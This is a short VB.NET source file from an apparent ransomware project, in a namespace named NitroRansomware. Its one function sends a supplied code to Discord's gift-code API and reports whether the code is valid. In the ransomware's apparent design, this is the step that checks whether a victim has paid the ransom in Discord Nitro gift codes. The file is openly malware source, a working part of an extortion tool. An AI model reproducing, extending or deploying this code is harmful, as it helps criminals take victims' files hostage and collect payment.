Imports System.Net.Http
Namespace NitroRansomware
	Friend Class Nitro
		Private Shared logging As New Logs("DEBUG", 0)
		Public Shared Function Check(ByVal code As String) As Boolean
			Using client As New HttpClient()
				Dim url As String = $"https://discord.com/api/v8/entitlements/gift-codes/{code}?with_application=true&with_subscription_plan=true"
				logging.Debug(url)
				Dim response = client.GetAsync(url)
				If response.Result.StatusCode <> System.Net.HttpStatusCode.NotFound Then
					Return True
				Else
					Return False
				End If
			End Using
		End Function

	End Class
End Namespace
